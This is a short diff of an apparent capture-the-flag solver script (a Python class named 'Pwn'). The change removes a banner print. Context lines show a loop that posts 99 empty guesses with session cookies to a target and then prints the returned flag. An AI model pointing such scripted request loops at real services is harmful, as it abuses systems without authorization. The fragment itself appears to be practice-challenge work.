@@ -100,10 +100,6 @@ class Pwn():
         
         for i in range(99):
             a = s.post(self.host, cookies=site_cookies, data={"guess": ""})
-
-        print(""" 
-        [+] Flag output [+]
-        -------------------""")
         print(s.post(self.host, cookies=site_cookies, data={"guess": ""}).text)
 
 def main():
